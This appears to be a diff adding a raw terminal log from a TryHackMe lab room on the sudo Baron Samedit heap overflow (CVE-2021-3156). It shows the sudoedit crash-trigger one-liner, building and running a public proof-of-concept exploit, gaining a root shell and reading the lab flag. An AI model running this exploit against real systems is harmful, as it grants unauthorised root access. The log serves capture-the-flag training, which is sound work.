@@ -1,0 +1,70 @@
+# https://tryhackme.com/room/sudovulnssamedit
+
+┌──────────────────────────────────────────────────────────────┐
+│   ______                          ____          _         __ │
+│  / ____/_____ ___   ___   ____   / __ \ ____   (_)____   / /_│
+│ / / __ / ___// _ \ / _ \ / __ \ / /_/ // __ \ / // __ \ / __/│
+│/ /_/ // /   /  __//  __// / / // ____// /_/ // // / / // /_  │
+│\____//_/    \___/ \___//_/ /_//_/     \____//_//_/ /_/ \__/  │
+│                                                              │
+└──────────────────────────────────────────────────────────────┘
+┌──(kali㉿kali)-[~]
+└─$ ssh tryhackme@10.10.182.51
+The authenticity of host '10.10.182.51 (10.10.182.51)' can't be established.
+ED25519 key fingerprint is SHA256:OdPmKbN+EkdmN1JGMria9Ywo9R1IJDKLXYyHJHOIc3g.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.182.51' (ED25519) to the list of known hosts.
+tryhackme@10.10.182.51's password: 
+
+
+         _____           _   _            _    __  __      
+        |_   _| __ _   _| | | | __ _  ___| | _|  \/  | ___ 
+          | || '__| | | | |_| |/ _` |/ __| |/ / |\/| |/ _ \
+          | || |  | |_| |  _  | (_| | (__|   <| |  | |  __/
+          |_||_|   \__, |_| |_|\__,_|\___|_|\_\_|  |_|\___|
+                   |___/                                   
+
+
+tryhackme@CVE-2021-3156:~$ sudoedit -s '\' $(python3 -c 'print("A"*1000)')
+malloc(): memory corruption
+Aborted (core dumped)
+tryhackme@CVE-2021-3156:~$ ls
+Exploit
+tryhackme@CVE-2021-3156:~$ cd Exploit/
+tryhackme@CVE-2021-3156:~$ cd Exploit/
+tryhackme@CVE-2021-3156:~/Exploit$ ls
+Makefile  README.md  hax.c  lib.c
+tryhackme@CVE-2021-3156:~/Exploit$ make
+rm -rf libnss_X
+mkdir libnss_X
+gcc -o sudo-hax-me-a-sandwich hax.c
+gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
+tryhackme@CVE-2021-3156:~/Exploit$ ls
+hax.c  lib.c  libnss_X  Makefile  README.md  sudo-hax-me-a-sandwich
+tryhackme@CVE-2021-3156:~/Exploit$ ./sudo-hax-me-a-sandwich 
+
+** CVE-2021-3156 PoC by blasty <peter@haxx.in>
+
+  usage: ./sudo-hax-me-a-sandwich <target>
+
+  available targets:
+  ------------------------------------------------------------
+    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
+    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
+    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
+  ------------------------------------------------------------
+
+tryhackme@CVE-2021-3156:~/Exploit$ ./sudo-hax-me-a-sandwich 0
+
+** CVE-2021-3156 PoC by blasty <peter@haxx.in>
+
+using target: 'Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27'
+** pray for your rootshell.. **
+[+] bl1ng bl1ng! We got it!
+# whoami
+root
+# id 
+uid=0(root) gid=0(root) groups=0(root),1000(tryhackme)
+# cat /root/flag.txt            
+THM{NmU4OWYwMWJmMjkxMDdiYTU4MWIxNWVk}
